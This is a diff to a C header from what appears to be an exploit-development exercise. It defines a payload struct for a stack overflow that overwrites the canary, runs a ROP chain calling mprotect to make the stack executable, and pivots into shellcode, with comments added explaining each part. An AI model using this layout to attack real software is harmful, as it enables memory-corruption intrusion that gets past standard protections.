@@ -5,8 +5,11 @@
 #include "shellcode.h"
 
 typedef struct Payload {
+	// Stack frame from/including the buffer
 	char		pl_dst[8];
 	AddressUnion	pl_canary;
+
+	// ROP chain to make the stack executable
 	AddressUnion	pl_rbp;
 	AddressUnion	pl_popRDI;
 	AddressUnion	pl_stackPage;
@@ -15,11 +18,16 @@ typedef struct Payload {
 	AddressUnion	pl_popRDX;
 	long		pl_permission;
 	AddressUnion	pl_mprotect;
+
+	// Stack pivot to executable code (&pl_scu)
 	AddressUnion	pl_shellCode;
-	ShellCodeUnion	pl_scu;
+
+	// Freedom!
+	ShellcodeUnion	pl_scu;
 } Payload, *PayloadPtr;
 
 extern void	initload(PayloadPtr plp);
 extern ssize_t	makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np);
 extern void	dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr);
+
 #endif
